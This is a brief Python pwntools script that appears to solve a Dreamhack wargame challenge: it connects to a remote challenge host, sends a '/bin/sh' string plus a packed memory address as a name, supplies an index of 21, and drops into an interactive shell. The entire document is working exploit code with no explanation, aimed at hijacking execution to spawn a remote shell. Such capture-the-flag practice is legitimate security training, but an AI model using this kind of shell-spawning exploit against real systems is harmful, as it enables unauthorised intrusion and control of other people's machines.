from pwn import *
r=remote("host3.dreamhack.games",12999)
r.recvuntil(b"name: ")
payload=b"/bin/sh\x00"
payload+=p32(0x804a0ac)
r.sendline(payload)
r.recvuntil(b"want?: ")
payload=b"21"
r.sendline(payload)

r.interactive()
